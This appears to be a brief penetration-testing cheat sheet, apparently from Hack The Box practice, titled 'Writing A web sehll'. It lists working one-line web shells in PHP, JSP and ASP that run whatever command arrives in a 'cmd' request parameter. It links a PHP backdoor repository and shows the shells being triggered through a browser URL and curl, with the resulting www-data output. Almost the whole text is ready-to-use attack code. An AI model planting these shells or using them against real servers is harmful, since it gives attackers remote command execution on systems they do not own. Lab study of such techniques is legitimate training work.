# Writing A web sehll

# PHP 

https://raw.githubusercontent.com/F-Masood/php-backdoors/main/rce.php

```bash

<?php system($_GET['cmd']); ?>

//or

//<?php echo (shell_exec($_GET['cmd'])); ?>

```


# jsp

```bash
<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
```

# asp

```bash
<% eval request("cmd") %>
```

# Accessing a web shell
* you can access it through a browser
```bash
http://SERVER_IP:PORT/shell.php?cmd=id
```
[OR]

* You can access it through curl
```bash
Mrwelldone@htb[/htb]$ curl http://SERVER_IP:PORT/shell.php?cmd=id

uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
